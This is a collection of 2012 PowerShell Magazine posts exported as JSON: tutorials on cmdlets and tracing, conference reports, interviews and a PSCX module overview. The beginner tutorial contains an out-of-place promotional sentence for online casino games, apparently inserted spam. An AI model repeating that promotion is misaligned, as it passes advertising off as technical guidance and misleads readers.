between begin, process and end block. First part can be easy traced:\nI was not able to find second part (distribution of script blocks) with Trace. But you can guess what is going on because you can get the same result if you make sure all script blocks will be passed to -Process parameter:\nPS\u0026gt; 1..5 | ForEach-Object -Process { \u0026#39;begin\u0026#39; }, { \u0026#34;process: $_\u0026#34; }, { \u0026#39;end\u0026#39; } I blogged about this but found the answer in Bruce Payette’s PowerShell in Action few weeks later. But that incident made me confident that if there are some PowerShell behaviours I don’t understand immediately, then using *Trace* command may provide an explanation. It helped me when I was trying to find out why function that had no Get-Process command in it was complaining about wrong syntax used with this cmdlet.\nLet’s reproduce this issue first:\n\u0026lt;pre\u0026gt;function Get-Foo { param ( [Parameter(ValueFromPipeline = $true)] [string]$Bar ) $Foo = 2 process { $Bar } } More experienced users will probably spot an issue immediately in this code, but real example was more complex than this one. What will happen if we use it?\nThis was starting point. Obviously, you won’t find any Get-Process in my code, so where did this error come from? At first, I’ve traced everything to understand why it works like that. Eventually I found root cause of this behaviour.\nThis is combination of two things: how keywords behave depending on the context and what PowerShell does if a given command doesn’t exist. PowerShell keywords are context-aware. That makes things like ‘foreach’ alias possible, but here, it complicates things. Because ‘process’ is used in the wrong context it’s no longer a keyword, PowerShell will assume its command:\nBut, how did we get an error from **Get-**Process? We won’t find alias or any other command named ‘process’ with Get-Command. That’s another feature that in this scenario becomes an issue:\nSo not only our keyword was behaving like a command, it was also prepended with get- to make our life easier, something that makes things like ‘date’ instead of ‘Get-Date’ possible.\nSo remember, whether it’s binding of arguments, ETS, converting types – whatever seems suspicious at first may become obvious once you employ detective inside you, together with two tools that no PowerShell detective can live without: Trace-Command and Get-TraceSource.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/10/powershell-detective/","tags":["How To"],"title":"PowerShell Detective"},{"categories":["News"],"contents":"The book, by Ed Wilson, the Microsoft Scripting Guy, is available for pre-order (45% off) on Amazon.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/10/windows-powershell-3-0-step-by-step/","tags":["News"],"title":"Windows PowerShell 3.0 Step by Step"},{"categories":["Interviews"],"contents":"Editor Aleksandar Nikolic caught up with Darren Mar-Elia, the CTO and founder of SDM Software \u0026amp; \u0026lt;GPOGUY.com\u0026gt;, at MMS 2012. Darren has been a Microsoft MVP in Group Policy technology for the last 8 years, and has written and spoken on Active Directory, Group Policy and PowerShell topics around the world. You’ll hear Darren talking about managing Group policy with PowerShell and how his PowerShell-based products have filled in a gap left even after Microsoft introduced Group Policy module with Windows Server 2008 R2. He’s talked briefly about his Group Policy-related session at MMS 2012 and announced “Best Practices for Designing and Consolidating Group Policy for Performance and Security” (http://northamerica.msteched.com/topic/details/2012/WSV206#fbid=qtp3Ihr8FLm) session that he’s preparing for TechEd NA in Orlando.\n  Links of interests:\n[http://www.sdmsoftware.com/\n]2 [http://gpoguy.com/\n]3 http://twitter.com/grouppolicyguy\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/09/interview-with-darren-mar-elia-from-mms-2012/","tags":["Interviews"],"title":"Interview with Darren Mar-Elia from MMS 2012"},{"categories":["News"],"contents":"On the third and final day of the PowerShell Deep Dive, the great content continued to roll.\nThe morning started with a bang when Richard Siddaway opened up with an overview of CDXML and how, using an XML configuration file, one can generate cmdlets from a WMI interface. Kenneth Hansen, from the PowerShell team, made sure that our minds were sufficiently churning with ideas for using this new feature before sharing that CDXML was not limited to WMI, but that there is an API that allows CDXML to target almost any other source! The face of unified management is changing, and we get to watch it unfold.\nOur own Aleksandar Nikolic covered how to build a constrained endpoint in PowerShell V3. One off the challenges to the new constrained endpoints is how to allow native executables in the remote session. Aleksandar shared some tips and tricks (like how to add the file system provider so that the shell can navigate to the location of the executable).\nI was up next, and talked about PowerShell Workflows. PowerShell Workflows are a very important new feature, but there are a number of tricky points. One key thing to remember from PowerShell Workflows is, while they look like PowerShell, they are not only PowerShell, but also Windows Workflow Foundation workflows. This means that scoping and variable access have some differences from a PowerShell script or module.\nJeff Hicks continued with some great tips for Office automation with PowerShell. He showed us how to use the macro recorder to get an idea of the commands necessary when working with the Office COM objects and gave us a great tip on storing the values of some standard named constants used by Office in a custom object or hashtable for easy retrieval.\nThe last session of the day was Bruce Payette, the lead language designer. Bruce talked in further depth about PowerShell Workflows and the underlying architecture for them. He stressed that PowerShell Workflows be used for an appropriate purpose, like deployment and configuration, and not for things like data aggregation.\nThe PowerShell Deep Dive was a great event full of excellent content. If you have not been to the Deep Dive before, you might not realize that the sessions are just the start of the learning here. The conference attendees are all passionate about building solutions and finding better ways to make themselves more efficient. The conversations before and after the regular day’s activities and between sessions is often as informative as the sessions themselves. In large part, this is due to the great spirit of community around PowerShell that drives its members to share what they’ve learned. If you have the opportunity to get to this event or one like it, it is well worth the investment of your time and effort to be a part of the conversation.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/05/day-3-from-the-powershell-deep-dive-at-tec-2012/","tags":["News","Conferences"],"title":"Day 3 From the PowerShell Deep Dive at TEC 2012"},{"categories":["News"],"contents":"On the second day of the PowerShell Deep Dive, we had another great lineup of presentations.\nThe day started with Jim Truher describing a technique for creating formatting files for using Format-Custom. He created a templating engine and used that to generate the xml formatting files. Very cool stuff. Watch his blog for the code.\nNext on the agenda was Kirk Munro. Kirk talked about the experience of using WMI and the rich capabilities provided, but noted that the discovery experience for properties and methods was lacking. He introduced a project that will be published (watch his blog) called WMIX (or the WMI Extensions). This project generates functions to wrap the calls to any WMI classes you desire. It also uses the metadata from WMI to create objects that are more representative of the objects.\nJames Brundage illustrated how PowerShell can be used as a web language with Pipeworks. Not only can you build web pages and web applicatiions with Pipeworks. Pipeworks also enables you to convert commands and modules to a software service.\nI was up after James and went through my experiences, thoughts, and considerations as I implemented PowerShell V3 as part of my Windows Server 2012 implementation.\nTravis Jones, from the PowerShell team, reviewed the enhancements in the jobs infrastructure with PowerShell V3. Jobs now have a classification (since there are so many types), and include some nice new data, including start time and end time.\nTome Tanasovski covered considerations for developing a corporate module repository. One interesting aspect of that talk was the discussion of versioning. Other considerations included access to the repository, who has the ability to publish to the repository, and whether or not you have development guidance for modules.\nThe last presentation of the day was a talk about FIM and PowerShell. Unfortunately, I missed that presentation.\nWe ended the day with a script party, where we had three tables of people discussing problems and solutions, working through code, and learning from each other. What a great end to a great day.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/03/day-2-from-the-powershell-deep-dive-at-tec-2012/","tags":["News","Conferences"],"title":"Day 2 From the PowerShell Deep Dive at TEC 2012"},{"categories":["How To","Learning PowerShell"],"contents":"Windows PowerShell is an extremely powerful scripting language, and when you first put your hands on PowerShell, you may get – frustrated! There are so many tiny but relevant details: curly braces, brackets, commas and what not. If you get one wrong, all fails. Bummer. That’s why I decided to view PowerShell like a video game, poker online games or more like those games I play at casinodames.com that make me feel so satisfied, click to view more about casinos online. You wouldn’t start your favorite ego shooter in expert level either and get blasted away all the time by the boss monster. Instead, conquer PowerShell step by step. Let’s start with PowerShell game level 1. You’ll be amazed what this level will enable you to do!\nMission Briefing Here are your mission details for today: You need to know what a “cmdlet” (say: “commandlet”) is, and you need to know how to submit additional information, the “parameters”, to a cmdlet. So let’s start our fighter pilot briefing by launching Windows PowerShell.\nLaunching PowerShell To launch PowerShell, open up the “Run” dialog, for example by pressing the keys WIN+R, enter “powershell.exe”, and press the Enter key. If all works out, an ugly black window opens (which is good because coincidentally this ugly window hosts the most modern scripting language). Or, Windows complains about a missing command: you may still be running Windows XP or Server 2003 which do not come with PowerShell built-in, so you need to find the optional (and free) download and install it before you can play with PowerShell. Visit your favorite Internet search engine and search for “KB968930 Windows XP” for example (or visit http://support.microsoft.com/kb/968929 directly if you can remember that URL).\nNext take a quick look inside that black window. Does it read “Windows PowerShell Copyright (C) 2009”? If it has a 2006 copyright, then you installed the outdated PowerShell version 1.0. Upgrade to version 2.0 right away! Use the tip above for searching and finding the correct download.\nConfiguring the Console Once you launched PowerShell, you’ll see a button for your PowerShell window in your taskbar. On Windows 7, right-click that button and pin it to the taskbar, then close the window. Open it again by clicking the pinned PowerShell button. Magic, magic: this time, the PowerShell console paints its background blue. You just opened a preconfigured PowerShell. Aside from the pleasant color, the screen buffer now is 3000 lines high (rather than the default 300 lines) which is nice because PowerShell cmdlets tend to spit out a lot of data, and you don’t want the information to scroll out of your buffer. When you right-click your pinned taskbar button, a jump list opens and gives you quick access to the other PowerShell components, like a help file and the simple PowerShell editor “Windows PowerShell ISE”.\nOn Pre-Windows 7, to open the preconfigured blue PowerShell window, visit the Accessories program group and open PowerShell there. You can also always click the icon on the left side of the opened PowerShell console window title bar, and then choose “Properties” to manually adjust all the console settings. Make sure you set the screen buffer to at least 3000 lines, and pick the colors and font you like best.\nPlaying With Cmdlets To make PowerShell do something, you need to know what your weapons are. Most of what PowerShell can do is encapsulated in a “cmdlet”, a basic command that is responsible for one specific area or topic.\nTo find the right weapon for a mission, each cmdlet has a formal name. It consists of a verb (what it does, weapon category) and a noun (what it acts upon, its target range). The mother of all cmdlets is called “Get-Command”: it “gets” you all other “commands”.\nPS\u0026gt; Get-Command As it turns out, Get-Command not only returns cmdlets but also other command types that are beyond the current video game level.\nMission 1: Getting Cmdlet List Our first fighter mission: “Obtain a list of all cmdlets available!”\nGet-Command is what we need but it is returning too much information. Here is some PowerShell wisdom: “The only way to fine-tune a cmdlet is by providing extra parameters”. What could be the parameter to make Get-Command list only commands of type “cmdlet”?\nThere is yet another old fighter pilots’ trick: when you look at the output, you’ll notice that it is organized in columns, and each column has a column header. If you want to filter the result by the content of any of these columns, look for a parameter that is called like the column header!\nUhm, that’s right: there is a column called “CommandType” that tells the type of command. Is there a parameter -CommandType, too? Try this:\nPS\u0026gt; Get-Command -Comm[Press TAB] Pressing TAB invokes autocompletion, and PowerShell completes the parameter name, so it really exists! Submit the information that we want to filter the result:\nPS\u0026gt; Get-Command -CommandType cmdlet Heck, that worked! A parameter here is a key-value pair. The parameter name starts with a “-“, and after the parameter name, you add the argument that you want to bind to that parameter. To discover all parameters a cmdlet supports, either use autocompletion:\nPS\u0026gt; Get-Command -[Press TAB now repeatedly] Each time you press TAB, PowerShell suggests another parameter to you. If you typed TAB too quickly and passed the parameter you were after, press SHIFT+TAB and try not to break your fingers while you do.\nOr, use Get-Help:\nPS\u0026gt; Get-Help -Name Get-Command -Parameter * This gets you a formal list of all parameters, what they do and which data types they support.\nMission 2: Find The Best Weapon For The Job! Here’s your second mission: “Try and find a cmdlet that can read event log entries!” That’s an important mission because finding cmdlets is something you’ll be doing often in PowerShell.\nGet-Command can list all cmdlets, but it can do even more. It supports additional parameters that help you search for and find cmdlets in no time. As you have seen, each cmdlet name has a verb and a noun. Coincidentally, Get-Command has two parameters called -Verb and -Noun that you can use to search for cmdlets. This gets you all “Get”-cmdlets:\nPS\u0026gt; Get-Command -Verb Get Use wildcards to narrow down the results even more. Try and search for the keyword “event”:\nPS\u0026gt; Get-Command -Verb Get -Noun *Event* This time, you got back only four cmdlets, and Get-EventLog looks promising. If in doubt, you could use Get-Help to check out what the cmdlets really do:\nPS\u0026gt; Get-Help -Name Get-EventLog Mission 3: Getting Error Information from a Whacky Server Here’s our third mission: “Grab the latest 20 error events from the system event log, and once that worked, do it for an alien remote system.”\nYou know already the name of the cmdlet you need: Get-EventLog! Try and run Get-EventLog to see what happens next. On a side note, cmdlets starting with “Get” are always safe because they just read and never change things. You shouldn’t dare to “try out and see what happens” cmdlets that start with “Stop”, “Remove”, “Clear” or similar verbs. It may be brave, but that could easily turn out to be a career-limiting move. Remember, in a video game you may have 5 credits, in production systems that’s not always so. Stick to “Get”-cmdlets for now, and carefully read the information Get-Help provides for any other cmdlet before you use it.\nWhen you run Get-EventLog, PowerShell prompts you for a “LogName”. That tells you that “LogName” is a mandatory parameter. Without it, the cmdlet can’t do anything for you. So either submit the argument for “LogName”, for example by entering “System”, or press CTRL+C and start over again:\nPS\u0026gt; Get-EventLog -LogName System Success! Except, you only wanted the error events, and Get-EventLog dumped the entire log. You know how to fine-tune the cmdlet, right? Examine the column headers, identify the one you want to use for filtering, and add more parameters to Get-EventLog. The column listing the types of event entry is called “EntryType”, so use the parameter -EntryType:\nPS\u0026gt; Get-EventLog -LogName System -EntryType Error Mission almost accomplished. Now let’s limit this to the latest 20 error events. Use autocompletion or Get-Help to examine the additional parameters Get-EventLog supports:\nPS\u0026gt; Get-EventLog -LogName System -EntryType Error -Newest 20 Likewise, to address one or more remote systems, add the -computername parameter:\nPS\u0026gt; Get-EventLog -LogName System -EntryType Error -Newest 20 -ComputerName server1 PS\u0026gt; $servers = 'server1', 'server2', 'server3' PS\u0026gt; Get-EventLog -LogName System -EntryType Error -Newest 20 -ComputerName $servers As you see, many parameters allow multiple arguments (arrays), so you can query more than one server remotely (provided you have appropriate access permissions). Or, you can list errors and warnings:\nPS\u0026gt; Get-EventLog -LogName System -EntryType Error, Warning -Newest 20 Mission 4: Getting Hotfix Information Here is mission 4: “Get a list of all security hotfixes on your machine! Then, try the same with a remote alien machine!”\nFirst, find the cmdlet for the job. It starts with “Get”. What would be the noun part of its name? Search for fix:\nPS\u0026gt; Get-Command -Verb Get -Noun *fix* Right on: Get-Hotfix! Add a “-” and press TAB to view the available parameters. Can you come up with a solution? This one works on English and German systems:\nPS\u0026gt; Get-Hotfix -Description *security*, *sicher* Mission 5: Restarting a Service Our next mission is going to change something: “Restart the Spooler Service!”\nThis time, we don’t know the verb, but we do know the noun: “Service”! Let’s try:\nPS\u0026gt; Get-Command -Noun Service\nWhoa, PowerShell lists a family of cmdlets that all deal with services! It takes no time to identify “Restart-Service” as the one we need. Listing cmdlet families is a great way to extend your scope. After you completed this mission, try the same with Get-Eventlog: Get-Command -Noun EventLog.\nPS\u0026gt; Restart-Service -Name Spooler This time, you may get red error messages. The error message tells you what’s wrong: if the Spooler service has dependant services, you need to use the -Force parameter. Also, make sure you run PowerShell with full privileges. Restarting a service is nothing a regular user can do. To open a fully privileged PowerShell, try this:\nPS\u0026gt; Start-Process -Name powershell -Verb RunAs In it, try the mission solution:\nPS\u0026gt; Restart-Service -Name Spooler -Force Done!\nMission Debriefing With only a minimum of PowerShell details, you were able to complete a number of missions, and with this basic knowledge, you can solve many more. Once you know one cmdlet, you know them all. They all work basically the same. Let’s do a quick debriefing.\nYou have seen how Get-Command can get you the cmdlet for a job, and how you submit extra information by adding parameters to your call. To get more information about a cmdlet, use Get-Help:\nPS\u0026gt; Get-Help Restart-Service Most of us never start script code by scratch. Instead, we search the Internet, find samples and adjust them to our needs. In high school, this was called cheating. In your company, it’s probably called collaboration. Cmdlets bring tons of sample code that you can use as a starting point for your own code:\nPS\u0026gt; Get-Help Restart-Service -Examples To list all parameters a cmdlet supports, use -Parameter:\nPS\u0026gt; Get-Help Restart-Service -parameter * If you replace “Get-Help” by “help”, the information is displayed page by page. You can also redirect it to a file and open the file:\nPS\u0026gt; Get-Help -Name Restart-Service -Parameter * \u0026gt; $env:temp\\params.txt PS\u0026gt; Invoke-Item -Path $env:temp\\params.txt Most parameters consist of a key and a value, but that’s not always so. The parameter -Force was just a key, and no value was passed.\nIn PowerShell video game level 1, stick to named and switch parameters only, and ignore positional parameters. To use positional parameters, you need intimate knowledge about a cmdlet and must know at which position the cmdlet expects an argument. They are used by PowerShell Pros to speed up interactive PowerShelling. Compare these three lines. They all do the same but use different ways of shortening commands and parameters:\nPS\u0026gt; Get-Childitem -Path c:\\windows -Filter *.exe -Recurse -ErrorAction SilentlyContinue PS\u0026gt; Get-Childitem c:\\windows *.exe -Recurse -ErrorAction SilentlyContinue PS\u0026gt; ls c:\\windows *.exe -r -ea 0 For the time being, it is clever to stick to the verbose command syntax we used throughout this article. Have fun playing with PowerShell! Next time around, we’ll enter PowerShell video game level 2!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/02/getting-powershelled-in-10-minutes/","tags":["How To","Learning PowerShell"],"title":"Getting PowerShelled in 10 Minutes"},{"categories":["News"],"contents":"If you’re working with Office 365 than you may want to check out the Office 365 Helper Scripts package. This package includes a number of helper scripts created during Office 365 deployments.\nThe scripts require PowerShell 2.0 and the Microsoft Online PowerShell modules. Windows PowerShell 2.0 can be downloaded from the Script Center Downloads page. The Office 365 modules can be downloaded from Office 365 Cmdlets. In addition, the user executing these scripts must have administrator-level Office 365 credentials.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/02/office-365-helper-script-examples/","tags":["News"],"title":"Office 365 Helper Script Examples"},{"categories":["News"],"contents":"Day 1 has wrapped up on the PowerShell Deep Dive and we are getting ready to start Day 2. Day 1 was jam packed with PowerShell goodness.\nWe started out the day with Jeffrey Snover‘s keynote highlighting the evolution of PowerShell in its march to V3 and how the customer focus has driven the team to delivering a tool which can magnify our ability to implement solutions and a peek at what is to come.\nNext up was Tome Tanasovski, diving deep into P/Invoke and opening up new realms of possibilities for interacting with the Win32 APIs. Tome did a great job highlighting the various tips and tricks required to make P/Invoke work, and I really latched on to his explanation on how passing arguments by reference was important for P/Invoke and the importance of the Stringbuilder class.\nKirk Munro kept things rolling by opening our minds to the power of Proxy Functions and highlighted the PowerShell Proxy Extensions project to help us bend PowerShell commands to our will and workflow. Kirk opened our eyes to the metaprogramming capabilities built into the core of PowerShell and how we can create rich wrappers for commands that maintain the consistency of the commands, but add (or remove) functionality.\nBrandon Shell continued the roll by exposing us to the capabilities of the PowerShell ResKit for Splunk and the unique integrations that enables. He really blew our minds with the real-time analytics that can be plumbed with PowerShell.\nKrishna Vutukuri stepped up for the PowerShell team to bring us up to speed on the changes in PowerShell remoting in V3. The portability of PowerShell sessions (Disconnect/Connect) really changes the PowerShell remote management game.\nFinally, Adam Driscoll brought the Virtualization track and the PowerShell tracks together to highlight the new Hyper-V commands and capabilities in Windows Server 2012. One of the key new features that Adam highlighted was Hyper-V Replica and the relatively few commands that are needed to make that functionality just work.\nI can’t wait for today’s sessions!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/05/01/day-1-from-the-powershell-deep-dive-at-tec-2012/","tags":["News","Conferences"],"title":"Day 1 From the PowerShell Deep Dive at TEC 2012"},{"categories":["PSCX","Module Spotlight"],"contents":"I started the PowerShell Community Extensions (PSCX) project to fill in some of the gaps in the set of built-in Windows PowerShell commands. Over the years, some of the PSCX command equivalents have made their way into Windows PowerShell including Start-Process, Select-Xml, Get-WebService_,_ and Get-Random. However, for anyone who has used the standard set of UNIX utilities via packages such as cygwin or MKS Toolkit knows, there are still quite a few missing commands in Windows PowerShell. Here are some of my favorites that PSCX provides.\nOne of the first cmdlets I missed was a PowerShell equivalent to the octal dump (od) utility. In PowerShell terms, we would call this a formatter as in Format-Hex:\nPS\u0026gt; [byte[]](1..32) | Set-Content -Encoding Byte foo.bin PS\u0026gt; Format-Hex foo.bin –HideAscii Address: 0 1 2 3 4 5 6 7 8 9 A B C D E F -------- ----------------------------------------------- 00000000 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 00000010 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20 Another PSCX formatter I use a lot is the Format-Xml cmdlet. This cmdlet is great for viewing pesky single-line, 8000 character wide XML files:\nPS\u0026gt; $xml = '\u0026lt;doc\u0026gt;\u0026lt;title name=\"foo\" desc=\"bar\"/\u0026gt;\u0026lt;/doc\u0026gt;' PS\u0026gt; $xml | Format-Xml –AttributesOnNewLine \u0026lt;doc\u0026gt; \u0026lt;title name=\"foo\" desc=\"bar\" /\u0026gt; \u0026lt;/doc\u0026gt; As a developer, I deal with lots of XML files (app.config files, MSBuild and TeamBuild project files, etc). One cmdlet I find very handy to use on these XML files before checking them in is Test-Xml:\nPS\u0026gt; '\u0026lt;doc\u0026gt;\u0026lt;title\u0026gt;\u0026lt;/doc\u0026gt;' | Test-Xml –Verbose VERBOSE: The 'title' start tag on line 1 does not match the end tag of 'doc'. Line 1, position 15. False The Test-Xml cmdlet verifies that the XML is well-formed and if a schema is provided it will also validate the XML against the schema.\nI’ve contributed a number of PowerShell scripts to our build and test processes. Those PowerShell scripts can break our build if I’m not careful when I’m checking in updates. I use the Test-Script cmdlet to make sure a script is free of syntax errors before checking it in:\nPS\u0026gt; 'for($i=0;$i\u0026lt;10;$i++){$i}' | Test-Script WARNING: Parse error on line:1 char:12 - The '\u0026lt;' operator is reserved for future use. False Note: the Test-Script cmdlet uses the PSParser tokenizer provided in PowerShell v2 which only catches syntax errors and not runtime errors.\nIf you’ve ever needed to execute a batch file to modify environment variables for the current PowerShell session, then Invoke-BatchFile will come in very handy. Normally with the execution of a batch file, the new environment variable definitions exist only in the spawned cmd.exe process. Invoke-BatchFile will import those environment variable definitions back into the PowerShell session that executed the batch file. I use this command to import Visual Studio environment variables into my PowerShell session:\nPS\u0026gt; Invoke-BatchFile \"${env:VS100COMNTOOLS}..\\..\\VC\\vcvarsall.bat\" amd64 For developers, the Test-Assembly cmdlet can be useful in your build scripts. For example, when you need to re-sign partially signed assemblies you don’t want to apply the re-signing utility to native DLLs:\nPS\u0026gt; Get-ChildItem *.dll | where {Test-Assembly $_} | \u0026gt;\u0026gt; foreach {sn.exe -R $_ key.snk} \u0026gt;\u0026gt; One of the commands that can be useful to any PowerSheller is a native application called echoargs.exe. You use it when you’re trying to troubleshoot problems passing arguments to native applications. You stand a much better chance of fixing the problem if you can see what PowerShell is passing to the native application. echoargs.exe is used as a stand-in for your application. All it does is showing you the command line arguments that PowerShell passes to the application. This Team Foundation command fails when executed in PoweShell: tf.exe status . /r /workspace:*;hillr. If you substitute echoargs for the .exe file, then you can see what is going on:\nPS\u0026gt; echoargs status . /r /workspace:*;hillr Arg 0 is \u0026lt;status\u0026gt; Arg 1 is \u0026lt;.\u0026gt; Arg 2 is \u0026lt;/r\u0026gt; Arg 3 is \u0026lt;/workspace:*\u0026gt; The term hillr is not recognized as the name of a cmdlet.\nechoargs shows that the ;hillr part of the argument doesn’t even make it to the application. The problem is that the “;” character is a statement separator in PowerShell. You need to put quotes around the argument to ensure it gets to tf.exe in one piece:\nPS\u0026gt; echoargs status . /r '/workspace:*;hillr' Arg 0 is \u0026lt;status\u0026gt; Arg 1 is \u0026lt;.\u0026gt; Arg 2 is \u0026lt;/r\u0026gt; Arg 3 is \u0026lt;/workspace:*;hillr\u0026gt; There are many more useful PSCX commands such as Set-FileTime, Set-Writable, Set-ReadOnly, Unblock-File, and Show-Tree. Hopefully I’ve piqued your interest in the PowerShell Community Extensions. If so, give PSCX a try at http://pscx.codeplex.com.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/04/30/powershell-community-extensions/","tags":["Modules","PSCX"],"title":"PowerShell Community Extensions"},{"categories":["News"],"contents":"Want to test drive the new and improved features of Windows PowerShell?\nCheck out the Windows Server 2012 Beta Virtual Labs page where you can find virtual labs, three of which are on Windows PowerShell!\nIntroduction to Windows PowerShell Fundamentals Windows PowerShell is a command-line shell and scripting language that helps you achieve greater control and productivity. Using a new admin-focused scripting language, more than 230 standard command-line tools, and consistent syntax and utilities, Windows PowerShell enables you to more easily control system administration and accelerate automation.\nWhat\u0026rsquo;s New in Windows PowerShell 3.0 In this lab, you will explore some of the new features and functionality in Windows PowerShell 3.0 to enable you to more easily control system administration and accelerate automation.\nManaging Windows Server 8 with Server Manager and Windows PowerShell 3.0 In this lab, you will learn how the Server Manager and Windows PowerShell framework in Windows Server 8 delivers an enhanced, multi-server management experience. You will learn to perform tasks such as multi-server management. You will also explore new Windows PowerShell capabilities including new cmdlets and the Windows PowerShell gateway.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/04/29/windows-server-2012-beta-virtual-labs/","tags":["News"],"title":"Windows Server 2012 Beta Virtual Labs"},{"categories":["Remoting","News"],"contents":"This free guide covers all of the hidden details, configuration tricks, and difficult scenarios involved with Windows PowerShell Remoting. Learn the secret and undocumented tricks to Windows PowerShell Remoting!\nPowerShell MVPs Don Jones and Dr. Tobias Weltner provides you a step-by-step directions for key tasks like configuring SSL listeners, enabling the second hop and more. They dive under the hood with diagnostic and troubleshooting details, and even help you explain Remoting to your management and IT security team.\nThe eBook is available for free, in many formats, at the PowerShell Book Guide website.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/04/28/secrets-of-powershell-remoting/","tags":["Remoting","News"],"title":"Secrets of PowerShell Remoting"},{"categories":["Interviews"],"contents":"Editor Aleksandar Nikolic caught up with Jeffrey Snover, Lead Architect for Windows Server and the Father of PowerShell, at MMS 2012. Aleksandar talks to Jeffrey about the concept of PowerShell, whether or not there really is a GUI vs. Command line conflict in Windows Server Management, getting started with PowerShell, and what was going on with PowerShell at MMS. Stay tuned to the end of the video for a description of the upcoming PowerShell Deep Dive conference!\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/04/27/interview-with-jeffrey-snover-from-mms-2012/","tags":["Interviews"],"title":"Interview with Jeffrey Snover from MMS 2012"},{"categories":["How To"],"contents":"You never know where you’re going to find inspiration. As a PowerShell MVP and a confessed Poshoholic, I tend to travel to conferences a fair bit. I go out of my way to attend those conferences and participate in discussions with other attendees so that I can hear what they have to say about PowerShell. PowerShell is great, but it’s far from perfect, and these conversations help me identify ways I can contribute to helping make the overall experience better. As much as these intentional interactions are great, it’s often even more useful to have the opportunity to be a fly on the wall, listening to (ok, eavesdropping on) discussions about PowerShell that are taking place in unexpected places, looking for seeds of inspiration that can grow into something that makes PowerShell even better.\nAt TechEd North America 2011 I had one such opportunity present itself. While I was working in the speakers lounge on my own presentation materials, I overheard a couple of C# developers talking and one of them was saying that they hate PowerShell. My interest was piqued, so I focused less on my own work and more on what they were saying. If I heard correctly (it can be difficult to catch what’s being said when you’re trying to inconspicuously eavesdrop on a conversation), the developer who was complaining had two major issues. I’ll touch on the first issue in this article, and save the other one for a follow-up article.\nPowerShell does not have a using keyword The first issue they pointed out was that they didn’t like having to type in so many full .NET type names when they typecast or when they create strongly typed objects. In C#, developers can work with shorter type names by invoking the using statement, allowing them to control exactly how much of a type name is required in order for the compiler to be able to recognize the type. For example, in C# if you were to write some code to work with a bunch of Windows Forms objects, you could do this:\nusing System.Windows.Forms; DialogResult result = MessageBox.Show(…); In this code snippet, both DialogResult and MessageBox can be used in the program without having to qualify them with their namespace because the using statement indicates that the namespace is automatically identified for objects that are defined within it. This is quite convenient and it can save a lot of typing in the long run.\nPowerShell doesn’t have a using statement however, at least not in PowerShell 2.0. The using keyword is reserved in PowerShell 2.0, but there is no statement or command in place that defines what that keyword will do. Using PowerShell 2.0 out of the box, if you wanted to create a script similar to the C# code that is shown above, you would have to do this:\n[System.Windows.Forms.DialogResult]$result = Since there is no using statement support, with long type names like these your PowerShell scripts may quickly require a lot more typing if you are interacting with .NET object types directly in those scripts. As someone who used to write C# code, this can definitely be disappointing. Fortunately though, it doesn’t have to be this way.\nType Accelerators Windows PowerShell 2.0 comes with built-in support for 31 type accelerators. Type accelerators are simply mappings between shorthand type names and the full object types that they represent. They exist to allow you to use a shorthand type name instead of a full type name. For example, you can create a switch parameter in a function by simply using the [switch] type name. Behind the scenes, PowerShell knows that [switch] is really [System.Management.Automation.SwitchParameter], but [switch] is much, much easier to type and use.\nRetrieving a list of type accelerators that exist in PowerShell is not easy. There are no cmdlets and no published interface that allows you to do this out of the box. Fortunately though there are some examples on various blog posts that identify a hidden, private type that can be used to get this list. That type is System.Management.Automation.TypeAccelerators, and it can be accessed in PowerShell like this:\n[System.Type]$typeAcceleratorsType = [System.Management.Automation.PSObject].Assembly.GetType( \u0026#39;System.Management.Automation.TypeAccelerators\u0026#39;, $true, $true ) It is possible to call GetType without passing in the second and third Boolean parameters, however if you do that you must make sure the type name you use has the proper case. The second parameter indicates you want the method to throw an exception if there is an error, and the third parameter indicates you want to perform a case insensitive lookup. Since PowerShell itself is case insensitive, I tend to use all three parameters here so that I don’t have to worry about case sensitivity.\nOnce you have access to that type, management of type accelerators is pretty straightforward and is done by using three static methods of that type. You can see the current list of accelerators by invoking $typeAcceleratorsType::Get. You can add your own type accelerator by invoking $typeAcceleratorsType::Add and passing in the string you want to use as an accelerator ad the type that you want it to be associated with (note: in PowerShell 3.0 CTP 1, this method has been renamed as AddReplace and in that release you can replace existing accelerators without first removing them). You can remove a type accelerator by invoking $typeAcceleratorsType::Remove and passing in the accelerator string you want to remove.\nThis is a great start, because now we can customize our type accelerators, but I doubt anyone that is looking for using keyword functionality in PowerShell would feel that this was a good solution because it’s missing all of the glue that would allow you to get fast access to all types within a namespace.\nEnumerating Namespaces Now that we’re armed with the knowledge required to manage type accelerators, let’s figure out how we can enumerate types inside namespaces so that we can get the most out of this capability. The first step in this enumeration process is the retrieval of the assembly containing the namespace we are interested in.\nThe System.Reflection.Assembly type has three very useful static methods that allow you to get assembly objects: Load, LoadWithPartialName, and LoadFrom. If you have the full name of the assembly whose namespace you want to enumerate, you can invoke the Load static method and pass in the full assembly name. If you only have a partial assembly name (i.e. none of the Public Key token stuff that is included in a full assembly name), you can invoke the LoadWithPartialName static method and pass in the partial name (note: don’t forget to include the System qualifier for namespaces that are part of the System namespace; otherwise they simply will not load). If you are working with an assembly that is not loaded in the Global Assembly Cache (GAC), you can use the LoadFrom static method and pass in the full path to the file containing the assembly you want to load.\nFor this example, I’m going to use the System.Windows.Forms namespace that I referred to earlier in this article. This namespace contains a lot of useful functionality that enables PowerShell scripters to include some user interface capabilities in their scripts, and it’s used very often in PowerShell 